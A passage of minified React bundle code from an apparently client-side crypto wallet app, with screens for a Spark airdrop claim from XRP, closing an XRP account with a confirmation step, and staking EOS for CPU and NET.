            O.useState)(!1)
              , [s,i] = airdrop_spark_xrp_use_use_initial_params()
              , [o,c] = (0,
            O.useState)({})
              , [u,d] = (0,
            O.useState)(!1)
              , [m,p] = (0,
            O.useState)("")
              , [f,E] = (0,
            O.useState)(null)
              , h = [...a].filter((e => "xrp" === e.currency))
              , g = [...a].filter((e => "eth" === e.currency))
              , [y,v] = (0,
            O.useState)(null)
              , [_] = fee_wallet(s)
              , [w,b,k,S] = use_fee(s, s, 0, {
                totalBalance: s ? s.balance : null
            });
            (0,
            O.useEffect)(( () => {
                if (f) {
                    EK = !1;
                    p(null);
                    d(!1)
                }
            }
            ), [f]);
            (0,
            O.useEffect)(( () => {
                m && !u && d(!0);
                if (!m) {
                    EK = !1;
                    d(!1)
                }
            }
            ), [m]);
            const handleChangeFromWallet = t => {
                e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !0
                }));
                i(t)
            }
              , handleChangeToWallet = t => {
                e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !0
                }));
                v(t)
            }
            ;
            (0,
            O.useEffect)(( () => {
                y || v(g[0])
            }
            ), [g]);
            (0,
            O.useEffect)(( () => {
                r && l(!1)
            }
            ), [s, y]);
            (0,
            O.useEffect)(( () => {
                async function loadInformation() {
                    const e = await Se.Z.getApiByWallet(s)
                      , t = await e.getSparkAirdropInfo(s.address);
                    t && c(t)
                }
                s && loadInformation()
            }
            ), [s]);
            const C = (0,
            Ko.gt)(w, null == s ? void 0 : s.balance)
              , handleNext = async () => {
                if (EK)
                    return;
                if (C)
                    return;
                EK = !0;
                E(null);
                const {isValid: a} = t.current.validate();
                a || l(!0);
                await p("Updating wallet balance...");
                await e(updateWalletsBalanceAndTxs(s, {
                    isCascade: !1
                }));
                await p(`Loading ${(0,
                be.xG)(s.currency)} Blockchain adapter...`);
                await p("Preparing transaction...");
                const r = await Se.Z.getApiByWallet(s);
                try {
                    const e = await r.sendSparkAirdropTransaction({
                        ethAddress: y.address,
                        addressFrom: s.address,
                        privateKey: s.privateKey
                    });
                    if (e.error) {
                        E(e.error);
                        return
                    }
                    if (e.hash) {
                        cc.$.send(cc.d.AIRDROP, "xrp");
                        n.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: objectToString({
                                type: "xrpAirdropTx",
                                hash: e.hash,
                                walletFrom: s.uuid,
                                currency: s.currency
                            })
                        })
                    }
                } catch (e) {}
            }
            ;
            function getInfoLabel() {
                var e;
                return null != o && null !== (e = o.info) && void 0 !== e && e.ethAddress ? O.createElement(O.Fragment, null, O.createElement("span", null, "You’ve already claimed Spark tokens. They will be distributed to your address, ", o.info.ethAddress, ", in the Flare network.")) : O.createElement("span", null, "You will receive the same amount of Spark tokens that you have on your XRP wallet as of the date of snapshot, December 12.")
            }
            return O.createElement("div", {
                className: fK.wrapper
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: mD
            }, "Spark tokens will be distributed after the Flare network is launched. Private keys of your Ethereum and Flare accounts will be the same. It is important to save the backup file or the private keys.", O.createElement("br", null), O.createElement("br", null))), O.createElement("div", {
                className: fK.wrapperForm
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "Choose XRP wallet"), O.createElement(Mh, {
                inputWrapperClassName: fK.inputWrapper,
                selectedWallet: s,
                wallets: h,
                onChange: handleChangeFromWallet,
                withoutWatchOnly: !0,
                withoutSubwallets: !0
            }), O.createElement("div", {
                className: fK.misk
            }, O.createElement(misk_info, null, O.createElement(MiskInfoValue, null, getInfoLabel()))), O.createElement("br", null), O.createElement(label, null, "Choose ETH wallet"), O.createElement(Mh, {
                inputWrapperClassName: fK.inputWrapper,
                selectedWallet: y,
                wallets: g,
                onChange: handleChangeToWallet,
                withoutWatchOnly: !0,
                withoutSubwallets: !0
            }), O.createElement("div", {
                className: fK.misk
            }, O.createElement(misk_info, null, O.createElement(MiskInfoValue, null, " To access Spark tokens on the Flare network, you have to use the same private keys as on this account."))), O.createElement("div", {
                className: fK.feeWrapper
            }, O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network Fee:"), O.createElement(ConfirmInfoValue, null, O.createElement("span", null, !w || k ? "–" : `${w} ${(0,
            be.xG)(_.currency)}`)))), b && O.createElement(ui_message, {
                type: "error"
            }, "Error calculating fee, please", " ", O.createElement("a", {
                className: fK.updateBalanceLink,
                onClick: S
            }, "try again")), C && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)(s.currency), " Balance. Available balance: ", s.balance, " ", (0,
            be.xG)(s.currency), O.createElement("br", null)), f && O.createElement(bf, {
                error: f
            }), O.createElement("div", {
                className: fK.footerBlock
            }, u && O.createElement("div", {
                className: fK.loaderWrapper
            }, m && O.createElement("span", null, m)), !u && O.createElement("div", {
                className: fK.stepInfo
            }, "Step 1 of 2"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big",
                isLoading: u,
                id: "sparkAirdropConfirm"
            }, "Confirm")))))
        }
        function useUpdateEffect(e) {
            let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
            const a = (0,
            O.useRef)(!0);
            (0,
            O.useEffect)(( () => {
                if (!a.current)
                    return e();
                a.current = !1
            }
            ), t)
        }
        const hK = "index_wrapper_20Ebl app_wrapperBlock_2EpA3"
          , gK = "index_wrapperForm_1HP-D app_wrapperLeftBlock_3QLZp"
          , yK = "index_footerBlock_dXmvb app_footerBlock_n86Kc"
          , vK = "index_stepInfo_2sbSs app_stepInfo_2VLE6"
          , _K = "index_inputWrapper_2GUUj"
          , wK = "index_feeWrapper_2RUcR"
          , bK = "index_toggleAdvancedOptions_1V_Ys"
          , kK = "index_checkboxText_1BaqA"
          , SK = "index_pasteButton_nyohg"
          , CK = "index_inputDestinationTag_1hjH8"
          , NK = "send-to-address"
          , TK = "send-to-wallet"
          , AK = "0.2";
        function BoardXrpDeleteAccPage() {
            const e = (0,
            $.I0)()
              , t = (0,
            O.createRef)()
              , a = (0,
            $.v9)($c)
              , n = (0,
            $.v9)(eu)
              , r = (0,
            j.k6)()
              , l = useLocationSearch()
              , [s,i] = (0,
            O.useState)("0");
            (0,
            O.useMemo)((async () => {
                var e;
                const t = await Se.Z.getApiByCurrency("xrp")
                  , a = null !== (e = await (null == t ? void 0 : t.getDeleteAccountFee())) && void 0 !== e ? e : AK;
                i(a)
            }
            ), [Se.Z]);
            const [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)(Boolean(l.destinationTag))
              , [m,p] = (0,
            O.useState)(!1)
              , [f,E] = (0,
            O.useState)(!1)
              , [h,g] = (0,
            O.useState)(l.destinationTag || "")
              , [y] = airdrop_spark_xrp_use_use_initial_params()
              , v = y && (0,
            Ko.h9)(y.balance, s).toString()
              , _ = [...a].filter((e => "xrp" === e.currency && (0,
            Ko.gt)(e.balance, "0") && y && y.uuid !== e.uuid))
              , [w,b] = (0,
            O.useState)(null)
              , [k,S] = (0,
            O.useState)(l.addressTo || "")
              , [C,N] = (0,
            O.useState)(NK)
              , T = O.useCallback(( () => {
                c(!1);
                const t = C === TK ? NK : TK;
                N(t);
                e(setCacheKey("sendType", t))
            }
            ), [e, C])
              , getTitleChangeAccount = () => C === TK ? "XRP address" : "My Wallet"
              , A = O.useCallback((e => S(e)), [])
              , handleValidateAddress = e => p(e)
              , handleValidateSelfAddress = e => E(e);
            (0,
            O.useEffect)(( () => {
                if (null != l && l.walletTo && a.length) {
                    const e = n(l.walletTo);
                    if (e) {
                        N(TK);
                        b(e)
                    }
                } else if (a.length && null != y && y.address) {
                    const e = a.find((e => "xrp" === e.currency && e.address !== (null == y ? void 0 : y.address)));
                    if (e) {
                        N(TK);
                        b(e)
                    }
                }
            }
            ), [null == l ? void 0 : l.walletTo, a.length, n, y]);
            const handleChangeToWallet = t => {
                c(!1);
                e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !0
                }));
                b(t)
            }
            ;
            (0,
            O.useEffect)(( () => {
                cc.$.send(cc.d.XRP_DELETE_ACCOUNT)
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                o && setTimeout(( () => c(!1)), 2e3)
            }
            ), [o]);
            useUpdateEffect(( () => {
                let e = !1;
                (async () => {
                    if (!y || !k)
                        return;
                    handleValidateSelfAddress((null == y ? void 0 : y.address) === k);
                    const t = await Se.Z.getApiByCurrency("xrp")
                      , a = await t.getAccountInfo({
                        address: k
                    });
                    e || handleValidateAddress(!!a.account_data)
                }
                )();
                return () => {
                    e = !0
                }
            }
            ), [k, y]);
            const handleNext = async () => {
                const {isValid: e} = t.current.validate();
                if (!e) {
                    c(!0);
                    return
                }
                const a = {
                    walletFrom: null == y ? void 0 : y.uuid,
                    receiveAmount: v,
                    fee: s
                };
                h && Object.assign(a, {
                    destinationTag: h.trim()
                });
                C === TK && Object.assign(a, {
                    walletTo: null == w ? void 0 : w.uuid
                });
                C === NK && Object.assign(a, {
                    addressTo: k.trim()
                });
                cc.$.send(cc.d.XRP_DELETE_ACCOUNT_CONFIRM);
                r.push({
                    pathname: (0,
                    M.RU)("/xrp-delete-account/confirm"),
                    search: objectToString({
                        ...a
                    })
                })
            }
            ;
            return O.createElement("div", {
                className: hK
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: mD
            }, "You can receive ", v, " XRP by closing this account.")), O.createElement("div", {
                className: gK
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "Close XRP account"), O.createElement(Mh, {
                inputWrapperClassName: _K,
                selectedWallet: null != y ? y : void 0,
                withoutWatchOnly: !0,
                withoutSubwallets: !0,
                noDisabledStyle: !0,
                disabled: !0
            }), O.createElement("br", null), O.createElement(label, null, "To", O.createElement(LabelAction, {
                onClick: T
            }, getTitleChangeAccount())), C === NK && O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                rules: zf.xrpAddress,
                value: {
                    isValidAddress: m,
                    isSelfAddress: f,
                    addressTo: k
                }
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && o,
                    message: a
                }, O.createElement(mE, {
                    value: k,
                    wallet: y,
                    onChange: A,
                    onEnter: handleNext,
                    customPlaceholder: "Enter an XRP address to receive remaining XRP"
                }))
            }
            )), !k && O.createElement(qr_scanner_paste_button, {
                setAddress: S
            })), C === TK && O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: w
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && o,
                    message: a
                }, O.createElement(Mh, {
                    updateBalanceOnChange: !0,
                    selectedWallet: null != w ? w : void 0,
                    wallets: _,
                    onChange: handleChangeToWallet,
                    withoutWatchOnly: !0,
                    withoutSubwallets: !0,
                    placeholder: "Select an XRP wallet to receive remaining XRP",
                    customFilter: e => onCustomFilterWallets(e, ["xrp"]),
                    emptyPlaceholder: "You can select only XRP here"
                }))
            }
            )), !u && O.createElement("div", {
                className: bK
            }, O.createElement("span", {
                onClick: () => d(!0),
                className: "dashedNormal"
            }, "Add Destination Tag")), u && O.createElement(lf.ValidatorField, {
                rules: !!h && zf.xrpDestinationTag,
                value: {
                    destinationTag: h.trim()
                }
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && o,
                    message: a
                }, O.createElement("div", {
                    className: "relative"
                }, O.createElement(label, null, "Destination Tag"), O.createElement(Ea, {
                    onEnter: handleNext,
                    className: CK,
                    placeholder: "Enter Destination Tag",
                    value: h,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return g(t)
                    }
                })))
            }
            )), O.createElement("div", {
                className: wK
            }, O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Network Fee:"), O.createElement(MiskInfoValue, null, s, " XRP"))), O.createElement("div", {
                className: yK
            }, O.createElement("div", {
                className: vK
            }, "Step 1 of 2"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big",
                id: "xrpDeleteAccount"
            }, "Next")))))
        }
        const xK = "confirm_wrapper_124gk app_wrapperBlock_2EpA3"
          , IK = "confirm_wrapperForm_I_CZl app_wrapperLeftBlock_3QLZp"
          , PK = "confirm_lock_2ZbTd"
          , LK = "confirm_headerTitles_3oTF1"
          , FK = "confirm_separator_oqW8T"
          , WK = "confirm_footerBlock_2WsVS"
          , RK = "confirm_stepInfo_3uTL4"
          , BK = "confirm_buttonsWrapper_rPVnV"
          , OK = "confirm_loaderWrapper_3b42i"
          , DK = "confirm_updateBalanceLink_3fXoE";
        let MK = !1;
        function BoardXrpDeleteAccConfirmPage() {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            $.I0)()
              , {localCurrency: n} = local_currency_useLocalCurrency()
              , r = (0,
            $.v9)(eu)
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)(!0)
              , [c,u] = (0,
            O.useState)(!1)
              , [d,m] = (0,
            O.useState)(!1)
              , [p,f] = (0,
            O.useState)(null)
              , [E,h] = (0,
            O.useState)(null);
            (0,
            O.useEffect)(( () => {
                if (e.walletFrom) {
                    const t = r(e.walletFrom);
                    t && f(t)
                }
            }
            ), [p]);
            (0,
            O.useEffect)(( () => {
                if (e.walletTo) {
                    const t = r(e.walletTo);
                    t && h(t)
                }
            }
            ), [E]);
            const [g,y] = (0,
            O.useState)(null)
              , [v,_] = (0,
            O.useState)(null)
              , {convertToFiat: w} = useConverter()
              , b = w(e.receiveAmount, p)
              , k = w(e.fee, p);
            function handleUnlockForm(e, t) {
                o(e);
                s(!1);
                t && u(!0)
            }
            (0,
            O.useEffect)(( () => {
                c && handleConfirm()
            }
            ), [c]);
            const setProcess = async e => {
                y(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (v) {
                    MK = !1;
                    setProcess(null);
                    m(!1)
                }
            }
            ), [v]);
            (0,
            O.useEffect)(( () => {
                g && !d && m(!0);
                if (!g) {
                    MK = !1;
                    m(!1)
                }
            }
            ), [g]);
            const S = (0,
            Ko.lt)(null == p ? void 0 : p.balance, "1")
              , handleUpdateBalance = e => async () => {
                setProcess("Updating wallet balance...");
                await a(updateWalletsBalanceAndTxs(e, {
                    isCascade: !0
                }));
                setProcess(null)
            }
              , C = e.walletTo ? null == E ? void 0 : E.address : e.addressTo;
            async function handleConfirm() {
                if (i)
                    s(!0);
                else if (!MK && null !== p) {
                    MK = !0;
                    _(null);
                    await setProcess("Updating wallet balance...");
                    await setProcess("Loading XRP Blockchain adapter...");
                    await setProcess("Preparing transaction...");
                    await setProcess("Broadcasting transaction to network...");
                    try {
                        await a(updateBalanceByWallet(p, !1));
                        const n = await Se.Z.getApiByCurrency("xrp")
                          , r = {
                            fromWallet: p,
                            destination: C
                        };
                        e.destinationTag && Object.assign(r, {
                            destinationTag: e.destinationTag
                        });
                        const l = await n.sendAccountDeleteTransaction(r);
                        if (l.error) {
                            _(l.error);
                            return
                        }
                        if (l.hash) {
                            cc.$.send(cc.d.XRP_DELETE_ACCOUNT_SUCCESS);
                            t.replace({
                                pathname: (0,
                                M.RU)("/send/success"),
                                search: objectToString({
                                    hash: l.hash,
                                    type: "xrpCloseAccountTx",
                                    addressTo: C,
                                    amount: e.receiveAmount,
                                    walletFrom: p.uuid
                                })
                            })
                        }
                    } catch (e) {
                        _("Failed delete XRP account")
                    }
                }
            }
            const handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/xrp-delete-account"),
                    search: location.search
                })
            }
            ;
            return p && E || e.addressTo ? O.createElement("div", {
                className: xK
            }, O.createElement(DashboardMenu, null), O.createElement(LockPasswordLabel, {
                params: e,
                back: "/app/xrp-delete-account/confirm",
                showLockPasswordLabel: l,
                onChangeStatus: handleUnlockForm
            }), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "You will no longer be able to manage this account")), O.createElement("div", {
                className: Ht()(IK, {
                    [PK]: i && l
                })
            }, O.createElement("div", {
                className: LK
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Close this XRP account and receive ", e.receiveAmount, " XRP?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will receive", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.receiveAmount), " XRP", O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: b
            }), " ", (0,
            be.xG)(e.toConvert || n)))), e.walletTo ? O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "To Wallet", O.createElement(ConfirmInfoSubTitle, null, "To address")), O.createElement(ConfirmInfoValue, null, E && E.title, O.createElement(ConfirmInfoSubValue, null, C))) : O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "To address"), O.createElement(ConfirmInfoValue, null, C)), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Closing account", O.createElement(ConfirmInfoSubTitle, null, "Address")), O.createElement(ConfirmInfoValue, null, p && p.title, O.createElement(ConfirmInfoSubValue, null, p && p.address))), e.destinationTag && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Destination Tag"), O.createElement(ConfirmInfoValue, null, formatAddress(e.destinationTag, 8))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, e.fee, " XRP", O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: k
            }), " ", (0,
            be.xG)(e.toConvert || n)))), O.createElement("div", {
                className: FK
            }), S && !!p && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient XRP Balance. Available balance: ", null == p ? void 0 : p.balance, " XRP", O.createElement("br", null), O.createElement("a", {
                className: DK,
                onClick: handleUpdateBalance(p)
            }, "Update wallet balance")), v && O.createElement(bf, {
                error: v
            }), O.createElement("div", {
                className: WK
            }, d && O.createElement("div", {
                className: OK
            }, g && O.createElement("span", null, g)), !d && O.createElement("div", {
                className: RK
            }, "Step 2 of 3"), O.createElement("div", {
                className: BK
            }, !d && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: d
            }, "Confirm"))))) : O.createElement("div", {
                className: xK
            }, O.createElement(DashboardMenu, null))
        }
        const UK = {
            wrapper: "staking_wrapper_JsdBj app_wrapperBlock_2EpA3",
            wrapperForm: "staking_wrapperForm_2ekQK app_wrapperLeftBlock_3QLZp",
            footerBlock: "staking_footerBlock_1rhNz app_footerBlock_n86Kc",
            stepInfo: "staking_stepInfo_1ARc5 app_stepInfo_2VLE6",
            inputCurrency: "staking_inputCurrency_XBP_Z"
        }
          , StakingEosStakingPage = () => {
            const e = (0,
            $.I0)()
              , t = O.createRef()
              , a = (0,
            $.v9)($c)
              , n = (0,
            j.k6)()
              , [r,l] = (0,
            O.useState)(!1)
              , [s,i] = (0,
            O.useState)("")
              , [o,c] = (0,
            O.useState)("")
              , {convertToFiat: u} = useConverter()
              , {fromWallet: d, setFromWallet: m, setAmount: p} = oG({
                ticker: "eos"
            })
              , f = [...a].filter((e => "eos" === e.currency))
              , E = (null == d ? void 0 : d.balance) || "0"
              , handleChangeFromWallet = t => {
                if (t) {
                    e(updateWalletsBalanceAndTxs(t, {
                        isCascade: !0
                    }));
                    m(t)
                }
            }
            ;
            (0,
            O.useEffect)(( () => {
                r && l(!1)
            }
            ), [d]);
            const h = (0,
            Ko.PD)((0,
            Ko.Wn)(s || "0"), (0,
            Ko.Wn)(o || "0")).toString()
              , handleNext = () => {
                const {isValid: e} = t.current.validate();
                if (!e) {
                    l(!0);
                    return
                }
                const a = {
                    walletFrom: null == d ? void 0 : d.uuid,
                    amount: null == d ? void 0 : d.balance,
                    stakeCpu: s,
                    stakeNet: o
                }
                  , r = (0,
                Ko.FH)(u(h, d, "usd"), {
                    max: 4
                });
                r && Object.assign(a, {
                    amountInUsd: r
                });
                n.push({
                    pathname: (0,
                    M.RU)("/staking-eos/staking/confirm"),
                    search: objectToString(a)
                })
            }
              , g = {
                precision: 4,
                min: "0",
                max: (0,
                Ko.h9)(E, o || "0").toString()
            }
              , y = {
                precision: 4,
                min: "0",
                max: (0,
                Ko.h9)(E, s || "0").toString()
            };
            function handleChangeCpuAmount(e) {
                let {target: {value: t}} = e;
                const a = (0,
                Ko.y4)(t);
                i(a)
            }
            function handleChangeNetAmount(e) {
                let {target: {value: t}} = e;
                const a = (0,
                Ko.y4)(t);
                c(a)
            }
            const v = O.memo(( () => O.createElement(panel_right_image, {
                src: mD
            }, "Stake tokens towards CPU and NET to get more access to the system's resources. You will be able to unstake the sum and get the tokens back in 72 hours.")));
            return d ? O.createElement(sG, {
                wallet: d,
                styles: UK,
                RightBlockContent: v
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "From"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: d
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Mh, {
                    withoutSubwallets: !0,
                    selectedWallet: d,
                    wallets: f,
                    onChange: handleChangeFromWallet,
                    withoutWatchOnly: !0,
                    customFilter: e => onCustomFilterWallets(e, ["eos"]),
                    stakingCurrency: "EOS"
                }))
            }
            )), O.createElement(label, null, "CPU Stake"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                required: !o,
                value: s,
                rules: zf.amount(g)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Ea, {
                    onChange: handleChangeCpuAmount,
                    value: s,
                    placeholder: "0"
                }), O.createElement("div", {
                    className: UK.inputCurrency
                }, "EOS"))
            }
            ))), O.createElement(label, null, "NET Stake"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                required: !s,
                value: o,
                rules: zf.amount(y)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && r,
                    message: a
                }, O.createElement(Ea, {
                    onChange: handleChangeNetAmount,
                    value: o,
                    placeholder: "0"
                }), O.createElement("div", {
                    className: UK.inputCurrency
                }, "EOS"))
            }
            ))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available:"), O.createElement(MiskInfoValue, {
                onClick: () => i(null == d ? void 0 : d.balance)
            }, (0,
            Ko.yF)(null == d ? void 0 : d.balance), " ", (0,
            be.xG)(null == d ? void 0 : d.currency))), O.createElement(AvailableForStaking, {
                currency: d.currency,
                maxAmount: E,
                setAmount: p
            }), d && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Total stake:"), O.createElement(MiskInfoValue, null, (0,
            Ko.yF)(h), " EOS")), O.createElement("div", {
                className: UK.footerBlock
            }, O.createElement("div", {
                className: UK.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))) : null
        }
          , GK = StakingEosStakingPage;
        let VK = !1;
        const StakingEosStakingConfirm = () => {
            const e = useLocationSearch()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = (0,
            $.I0)()
              , r = (0,
            $.v9)($c)
              , l = (0,
            $.v9)(eu)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)(void 0)
              , [u,d] = (0,
            O.useState)(null)
              , {convertToFiat: m} = useConverter()
              , [p,f] = (0,
            O.useState)();
            (0,
            O.useEffect)(( () => {
                r.length && f(l(e.walletFrom) || void 0)
            }
            ), [e.walletFrom, l, r]);
            const [E] = fee_wallet(p)
              , setProcess = async e => {
                c(e);
                return new Promise((e => setTimeout(e, 200)))
            }
            ;
            (0,
            O.useEffect)(( () => {
                p && n(updateWalletsBalanceAndTxs(p, {
                    isCascade: !0
                }))
            }
            ), [n, p]);
            (0,
            O.useEffect)(( () => {
                if (u) {
                    VK = !1;
                    setProcess(void 0);
                    i(!1)
                }
            }
            ), [u]);
            (0,
            O.useEffect)(( () => {
                o && !s && i(!0);
                if (!o) {
                    VK = !1;
                    i(!1)
                }
            }
            ), [s, o]);
            const handleUpdateBalance = e => async () => {
                if (e) {
                    setProcess("Updating wallet balance...");
                    await n(updateWalletsBalanceAndTxs(e, {
                        isCascade: !0
                    }));
                    setProcess(void 0)
                }
            }
              , handleBack = () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/staking-eos/staking"),
                    search: a.search
                })
            }
            ;
            if (!p || !E)
                return null;
            const h = p.hw || E.hw
              , g = (0,
            Ko.gt)(e.amount, p.balance)
              , y = m(e.stakeNet, p)
              , v = m(e.stakeCpu, p)
              , _ = (0,
            Ko.PD)(e.stakeNet || "0", e.stakeCpu || "0").toString()
              , w = m(_, p)
              , handleConfirm = async () => {
                if (VK)
                    return;
                const a = cc.$.txPerformanceStart();
                VK = !0;
                d(null);
                await setProcess("Updating wallet balance...");
                await n(updateWalletsBalanceAndTxs(p, {
                    isCascade: !0
                }));
                await setProcess(`Loading ${(0,
                be.xG)(p.currency)} Blockchain adapter...`);
                await setProcess("Preparing transaction...");
                const r = await Se.Z.getApiByWallet(p)
                  , l = {
                    addressFrom: p.address,
                    amount: `${e.stakeCpu}(cpu) + ${e.stakeNet}(net) = ${_}`,
                    amountInUsd: e.amountInUsd,
                    currency: "eos"
                };
                try {
                    const n = await r.stakeBandwidthResourses({
                        accountFrom: p.accountName,
                        addressFrom: p.address,
                        accountTo: p.accountName,
                        addressTo: p.address,
                        privateKey: p.privateKey,
                        amountForNet: e.stakeNet,
                        amountForCPU: e.stakeCpu
                    });
                    if (n.error) {
                        d(n.error);
                        ge.b.error(ge.d.FAILED_STAKE, {
                            currency: p.currency
                        }, n.error, l);
                        return
                    }
                    if (n.hash) {
                        cc.$.send(cc.d.STAKING_SEND, "eos");
                        const e = cc.$.txPerformanceEnd(a);
                        cc.$.send(cc.d.PERFORMANCE_TX_STAKE, p.currency, `${e} ms`);
                        ge.b.success(ge.d.STAKE_SUCCESS, {
                            currency: p.currency
                        }, "false", l);
                        t.replace({
                            pathname: (0,
                            M.RU)("/send/success"),
                            search: objectToString({
                                type: "eosStakingTx",
                                amount: _,
                                hash: n.hash,
                                walletFrom: p.uuid,
                                currency: p.currency
                            })
                        })
                    }
                } catch (e) {
                    d(e.message);
                    ge.b.error(ge.d.FAILED_STAKE, {
                        currency: p.currency
                    }, e, l)
                }
            }
            ;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Please check details and confirm")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Stake ", (0,
            Ko.yF)(_), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), "?")), !!e.stakeCpu && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Staking on CPU", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.stakeCpu), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: v,
                renderCurrency: !0
            })))), !!e.stakeNet && O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Staking on NET", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(e.stakeNet), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: y,
                renderCurrency: !0
            })))), p && e.walletFrom && O.createElement(ConfirmInfoWallet, {
                type: "from",
                wallet: p
            }), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Sending totally", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(_), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), O.createElement(ConfirmInfoSubValue, null, O.createElement(fiat_estimate_FiatEstimate, {
                value: w,
                renderCurrency: !0
            })))), O.createElement("div", {
                className: dM
            }), g && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)(p.currency), " Balance. Available balance: ", p.balance, " ", (0,
            be.xG)(p.currency), O.createElement("br", null), O.createElement("a", {
                className: vM,
                onClick: handleUpdateBalance(p)
            }, "Update wallet balance")), O.createElement(ledger_token_info, {
                parentWallet: E
            }), s && h && O.createElement(ui_message, null, "Please unlock you ", p.hw, ", choose ", (0,
            be.xG)(p.family), " app and then press Confirm."), u && O.createElement(bf, {
                error: u
            }), O.createElement("div", {
                className: fM
            }, s && O.createElement("div", {
                className: yM
            }, o && O.createElement("span", null, o)), !s && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !s && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: s
            }, "Confirm")))), O.createElement("input", {
                id: "stakingAmountInUsd",
                type: "hidden",
                name: "amountInUsd",
                value: e.amountInUsd
            }))
        }
          , KK = StakingEosStakingConfirm
          , HK = "unstaking_wrapper_2SHgJ app_wrapperBlock_2EpA3"
